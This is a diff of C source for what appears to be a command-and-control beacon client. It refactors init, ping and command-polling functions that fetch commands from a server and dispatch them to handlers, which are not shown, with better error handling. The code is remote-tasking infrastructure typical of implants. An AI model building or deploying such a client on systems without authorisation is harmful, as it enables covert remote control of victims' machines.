@@ -97,11 +97,28 @@ static bool send_init(ClientContext* ctx) {
   http_request_t req = {.url_path = "/beacon/init",
                         .body = protocol_get_message(builder),
                         .body_length = protocol_get_length(builder)};
-  http_response_t resp = {0};
 
-  bool result = send_http_request(ctx, &req, &resp);
+  http_response_t resp = {0};
+  NetworkError error = send_http_request(ctx, &req, &resp);
+
+  bool success = false;
+  if (error == NETWORK_SUCCESS) {
+    // Check for valid response
+    if (resp.status_code == HTTP_STATUS_OK) {
+      DEBUG_LOG("Initialization successful");
+      success = true;
+    } else {
+      DEBUG_LOG("Server returned error status: %d", resp.status_code);
+    }
+  } else {
+    DEBUG_LOG("Network error during initialization: %d", error);
+  }
+
+  // Cleanup
   protocol_builder_destroy(builder);
-  return result;
+  free_http_response(&resp);
+
+  return success;
 }
 
 static void handle_command(const char* command) {
@@ -128,15 +145,25 @@ static bool send_ping(ClientContext* ctx) {
                         .body_length = protocol_get_length(builder)};
 
   http_response_t resp = {0};
-  bool result = send_http_request(ctx, &req, &resp);
+  NetworkError error = send_http_request(ctx, &req, &resp);
 
-  if (result && resp.data) {
-    DEBUG_LOG("Ping response: %s", resp.data);
+  bool success = false;
+  if (error == NETWORK_SUCCESS) {
+    if (resp.status_code == HTTP_STATUS_OK) {
+      if (resp.data) {
+        DEBUG_LOG("Ping response: %s", resp.data);
+      }
+      success = true;
+    } else {
+      DEBUG_LOG("Ping failed with status code: %d", resp.status_code);
+    }
+  } else {
+    DEBUG_LOG("Ping failed with network error: %d", error);
   }
 
   protocol_builder_destroy(builder);
   free_http_response(&resp);
-  return result;
+  return success;
 }
 
 static bool check_for_commands(ClientContext* ctx) {
@@ -148,32 +175,66 @@ static bool check_for_commands(ClientContext* ctx) {
 
   http_request_t req = {.url_path = url, .body = NULL, .body_length = 0};
 
-  char* command = get_command_from_response(ctx, &req);
-  if (!command) {
-    DEBUG_LOG("No command received or error occurred");
-    return true;  // No command or error
+  http_response_t resp = {0};
+  NetworkError error = send_http_request(ctx, &req, &resp);
+
+  if (error != NETWORK_SUCCESS) {
+    DEBUG_LOG("Command poll failed with network error: %d", error);
+    return false;
   }
 
-  DEBUG_LOG("Received command: %s", command);
+  if (resp.status_code == HTTP_STATUS_NO_CONTENT) {
+    DEBUG_LOG("No pending commands");
+    free_http_response(&resp);
+    return true;
+  }
 
-  command_handler handler = get_command_handler(command);
-  if (handler) {
-    DEBUG_LOG("Found handler for command: %s", command);
-    char* result = handler();
-    if (result) {
-      DEBUG_LOG("Command execution result: %s", result);
-      // Send result back to server
-      // TODO: Implement command response protocol
-      free(result);
-    } else {
-      DEBUG_LOG("Command execution returned no result");
+  if (resp.status_code != HTTP_STATUS_OK || !resp.data) {
+    DEBUG_LOG("Invalid response: status=%d", resp.status_code);
+    free_http_response(&resp);
+    return false;
+  }
+
+  DEBUG_LOG("Parsing response: %s", resp.data);
+
+  char* command = NULL;
+  char* lines = strdup(resp.data);
+  if (!lines) {
+    free_http_response(&resp);
+    return false;
+  }
+
+  char* line = strtok(lines, "\n");
+  while (line) {
+    if (strncmp(line, "command: ", 9) == 0) {
+      command = strdup(line + 9);
+      break;
     }
-  } else {
-    DEBUG_LOG("No handler found for command: %s", command);
+    line = strtok(NULL, "\n");
   }
 
-  free(command);
-  DEBUG_LOG("Command processing complete");
+  free(lines);
+  free_http_response(&resp);
+
+  if (command) {
+    DEBUG_LOG("Found command: %s", command);
+    command_handler handler = get_command_handler(command);
+    if (handler) {
+      DEBUG_LOG("Found handler for command: %s", command);
+      char* result = handler();
+      if (result) {
+        DEBUG_LOG("Command execution result: %s", result);
+        // TODO: Implement command response protocol
+        free(result);
+      } else {
+        DEBUG_LOG("Command execution returned no result");
+      }
+    } else {
+      DEBUG_LOG("No handler found for command: %s", command);
+    }
+    free(command);
+  }
+
   return true;
 }
 
